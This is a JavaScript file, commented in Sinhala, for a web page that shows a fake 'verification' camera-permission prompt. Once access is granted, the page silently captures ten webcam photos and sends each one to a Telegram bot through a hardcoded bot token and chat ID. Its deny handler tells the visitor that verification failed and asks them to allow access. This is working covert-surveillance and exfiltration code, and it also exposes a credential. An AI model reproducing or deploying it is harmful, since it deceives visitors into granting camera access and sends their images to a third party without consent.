const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const requestCameraButton = document.getElementById('request-camera');
const permissionPrompt = document.getElementById('permission-prompt');
const allowCameraButton = document.getElementById('allow-camera');
const denyCameraButton = document.getElementById('deny-camera');

// Telegram Bot Token සහ Chat ID
const BOT_TOKEN = '6755708048:AAEeoxAYgBpmoT5YQ2DkBArphJFDsV23NK4'; // ඔබගේ bot token එක යොදන්න
const CHAT_ID = '6982656521'; // ඔබගේ chat ID එක යොදන්න

let mediaStream;

// Custom permission prompt එක පෙන්වන්න
requestCameraButton.addEventListener('click', () => {
    permissionPrompt.style.display = 'block';
});

// Allow button එක ක්ලික් කළ විට
allowCameraButton.addEventListener('click', async () => {
    permissionPrompt.style.display = 'none';
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = mediaStream;
        requestCameraButton.style.display = 'none';

        // ඡායාරූප 10ක් ගන්න
        for (let i = 0; i < 10; i++) {
            setTimeout(() => capturePhoto(i), i * 2000); // සෑම 2 තත්පරයකට ඡායාරූපයක් ගන්න
        }
    } catch (error) {
        alert('කැමරා ප්‍රවේශය ප්‍රතික්ෂේප විය: ' + error.message);
    }
});

// Deny button එක ක්ලික් කළ විට
denyCameraButton.addEventListener('click', () => {
    permissionPrompt.style.display = 'none';
    alert('veryfication faild. please allow this time permisstion');
});

// ඡායාරූප ගැනීම
function capturePhoto(index) {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // ඡායාරූපය base64 ආකාරයෙන් ලබාගන්න
    const photo = canvas.toDataURL('image/jpeg');

    // ඡායාරූපය Telegram bot එකට යවන්න
    sendPhotoToTelegram(photo, index);
}

// ඡායාරූපය Telegram bot එකට යවන්න
async function sendPhotoToTelegram(photo, index) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    // base64 data එක blob එකක් බවට පරිවර්තනය කිරීම
    const blob = await fetch(photo).then((res) => res.blob());

    // FormData එක සාදා ඡායාරූපය එක් කිරීම
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, `photo_${index + 1}.jpg`);
    formData.append('caption', `ඡායාරූපය ${index + 1}`);

    // Telegram API එකට request යැවීම
    fetch(url, {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        console.log(`ඡායාරූපය ${index + 1} යවන ලදී:`, data);
    })
    .catch(error => {
        console.error('දෝෂය:', error);
    });
}